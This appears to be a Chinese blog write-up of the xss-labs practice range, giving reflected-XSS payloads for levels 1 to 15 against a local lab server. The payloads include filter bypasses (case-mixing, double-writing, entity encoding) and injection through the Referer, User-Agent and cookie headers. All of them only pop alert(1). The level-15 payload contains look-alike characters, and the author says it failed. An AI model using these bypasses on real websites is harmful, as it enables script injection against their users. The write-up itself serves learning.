---
title: xss-labs
author: Creexile
date: 2024-08-22 17:06:24
lastMod: 2024-08-22
summary: '该死你怎么还活着? 我们在living-room里'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [XSS, CTF]
---

# xss-labs

## level1

在url直接输入即可

```
level1.php?name=<script>alert(1)</script>
```

## level2

```html
<body>
  <h1 align="center">欢迎来到level2</h1>
  <h2 align="center">没有找到和test相关的结果.</h2>
  <center>
    <form action="level2.php" method="GET">
      <input name="keyword" value="test" />
      <input type="submit" name="submit" value="搜索" />
    </form>
  </center>
  <center><img src="level2.png" /></center>
  <h3 align="center">payload的长度:4</h3>
</body>
```

可以从第五行处进行利用, 闭合前面的语句即可

```
level2.php?keyword="><script>alert(1)</script>
```

本机上检查源码发现第三行利用的函数为`htmlspecialchars`, 很可惜没成

还可以构造onclick属性, 因为是`<input>`标签

```
level2.php?keyword=" onclick="alert(1)
```

此时文本框有了一个点击事件, 点击文本框就能看到弹窗进入下一关

## level3

`<input>`标签继续尝试:

```
level3.php?keyword=' onclick='alert(1)&submit=%E6%90%9C%E7%B4%A2
```

点击搜索框即可

> 双引号被编码

## level4

还是可以直接用

```
# 点击搜索框
level4.php?keyword=" onclick="alert(1)&submit=%E6%90%9C%E7%B4%A2
# 点击搜索
level4.php?keyword='" onblur='alert(1)'&submit=%E6%90%9C%E7%B4%A2
```

## level5

对事件on做了过滤, 同时过滤了script, 增加了\_使得它们失效

试试`<a>`标签, 发现是可以塞进去的, 只过滤了script

```
level5.php?keyword="><a href='javascript:alert(1);'>cnm</a>&submit=%E6%90%9C%E7%B4%A2
```

## level6

可以大小写绕过

```
level6.php?keyword=" Onclick="alert(1)&submit=%E6%90%9C%E7%B4%A2
level6.php?keyword="><a Href='javascript:alert(1);'>cnm</a>&submit=%E6%90%9C%E7%B4%A2
```

## level7

尝试利用下面的payload发现on被替换为空:

```
" onclick="alert(1)
```

尝试双写, 成功绕过

```
level7.php?keyword=" oonnclick="alert(1)&submit=%E6%90%9C%E7%B4%A2
```

## level8

内容输出在了a标签的href属性中, javascript不仅加了`_`, 并且将特殊符号进行了编码无法闭合

但是属性值是可以进行编码绕过的, 进行一个html的实体编码:

```
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#106;&#97;&#100;&#101;&#110;&#34;&#41;
```

> hex编码也可以
>
> `javasc&#x72;&#x69;pt:alert(/xss/)`

输入到输入框再点击友情链接即可

```
level8.php?keyword=%26%23106%3B%26%2397%3B%26%23118%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2358%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2334%3B%26%23106%3B%26%2397%3B%26%23100%3B%26%23101%3B%26%23110%3B%26%2334%3B%26%2341%3B&submit=%E6%B7%BB%E5%8A%A0%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5
```

## level9

[unicode编码](https://www.matools.com/code-convert-unicode)

```php
<?php
if(false===strpos($str7,'http://'))
{
  echo '<center><BR><a href="您的链接不合法？有没有！">友情链接</a></center>';
 }
else
{
  echo '<center><BR><a href="'.$str7.'">友情链接</a></center>';
}
?>
```

必须要有http://, 但是在最后增加会导致跳转不可用, 注释掉http://就行

```
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;//http://
```

## level10

在源码可以找到三个传参点, 最后找到`t_sort`可以作为传参点, 传参在value

```html
<input name="t_link" value="" type="hidden" />
<input name="t_history" value="" type="hidden" />
<input name="t_sort" value="" type="hidden" />
```

input标签进行注入可以闭合属性, 构造新的属性, 同时把type="hidden"属性替换掉

```
level10.php?keyword=1&t_sort='" type='text' onclick='alert(1)'
```

## level11

```html
<input name="t_link" value="" type="hidden" />
<input name="t_history" value="" type="hidden" />
<input name="t_sort" value="" type="hidden" />
<input
  name="t_ref"
  value="http://127.0.0.1:8903/level10.php?keyword=1&t_sort=%27%22%20type=%27text%27%20onclick=%27alert(123)%27"
  type="hidden"
/>
```

这个`t_ref`是上一关跳转过来的referer, referer是没有过滤的

所以将下面payload塞进referer然后取得输入框焦点即可:

```
'"type='text' onclick='alert(1)'
```

## level12

`t_ua`没有被编码, 这次是User Agent, 换成上面的payload即可

## level13

刷新页面抓包, 将Cookie改成上面的payload即可

## level14

[大佬解析](https://blog.csdn.net/qq_40929683/article/details/120422266?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172425177016800182119154%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=172425177016800182119154&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-120422266-null-null.142^v100^pc_search_result_base6&utm_term=xss-labs%2014&spm=1018.2226.3001.4187)

需要安装flash我认为可以直接拉倒

反正就是上传一个包含xss的图片然后被解析出来

## level15

跳转有问题, 我自己的网址是: `/level15.php?src=1.gif`

根据提示和官方文档, 发现可以包含页面, 尝试包含level1

```
http://127.0.0.1:8903/level15.php?src=%27http://127.0.0.1:8903/level1.php%27
```

利用level1的payload似乎被过滤了, 尝试后是`<script>`

尝试其他的, 发现可以利用以下payload

```
http://127.0.0.1:8903/level15.php?src='level1.php?name=<img src=123 οnerrοr=alert(1)>'
```

无法弹出弹窗, 拉倒了
